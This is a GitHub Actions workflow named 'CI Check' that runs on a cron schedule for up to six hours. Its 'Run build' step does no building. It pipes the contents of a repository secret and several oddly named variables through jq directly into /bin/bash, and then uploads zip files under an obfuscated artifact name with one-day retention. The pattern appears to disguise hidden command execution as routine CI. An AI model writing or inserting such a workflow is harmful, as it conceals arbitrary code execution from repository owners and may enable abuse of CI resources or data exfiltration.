name: CI Check
on:
  workflow_dispatch:

  schedule:
    - cron: '55 1,7,13,19 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  perform:
    name: Run build
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Run build
        env:
          str4: ${{ secrets.str4 }}
        run: |
          printf '%s' "$str4" | jq -r .tnaxm2 | /bin/bash
          printf '%s' "$kxzr09" | jq -r .ox29376 | /bin/bash
          echo $s3 | jq -r .y72 | /bin/bash
          echo $rqxs42746 | jq -r .j5 | /bin/bash
          echo $cvin94898 | jq -r .mxore7 | /bin/bash

      - name: Save archive
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: cldi54Qq
          path: "*.zip"
          retention-days: 1
